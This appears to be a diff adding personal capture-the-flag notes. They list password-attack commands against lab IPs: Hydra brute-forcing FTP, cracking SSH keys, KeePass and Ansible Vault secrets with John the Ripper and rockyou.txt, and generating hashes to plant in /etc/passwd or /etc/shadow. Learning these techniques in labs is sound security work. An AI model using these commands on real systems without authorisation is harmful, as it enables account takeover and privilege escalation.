@@ -1,0 +1,44 @@
+hydra -l jenny -P rockyou.txt 10.10.43.55 ftp
+
+------ rsa crack----------
+1. python3 ssh2john.py kay_id_rsa > forjohn.txt
+
+
+acess
+ssh -i id_rsa kay@10.10.244.248
+-------------------------------
+rockyou.txt theke 6 character password niyar option:
+grep -E '^.{6}$' rockyou.txt > dic.txt
+----------------------------------
+
+keepass2john easy_keesy > kp
+john --wordlist=/usr/share/wordlists/rockyou.txt -format:keepass kp
+
+#Save with newline preserved
+echo '$ANSIBLE_VAULT;1.1;AES256
+32313438363938386263306136303839653830363838326466313566393330616130303861643363
+3463623464306163343466393338336365656436386333320a306664343239666634316636633630
+63633031396233366539616265633161346637626435363732333637663336363338346536643834
+6666653830363637390a636566663836363062326535356164396162373331313662326663613532
+32303062323465313035313361393962333163306462313865313165393034363832' > ansible.yml
+
+#Use ansible2john.py 
+/usr/share/john/ansible2john.py ansible.yml > hash
+
+#Crack the hash
+john hash --wordlist=rockyou.txt
+
+#Decrypt the file with password we found
+ansible-vault view --ask-vault-pass ansible.yml 
+
+take rsa private_key-------------
+ssh2john.py kay_id_rsa > forjohn.txt
+john forjohn.txt --wordlist=rockyou.txt
+
+========================
+============================
+Generate a new password hash with a password of your choice:
+------------------------------------------------------
+openssl passwd kalikali // for grep root /etc/passwd
+or
+mkpasswd -m sha-512 kalikali  //for cat /etc/shadow
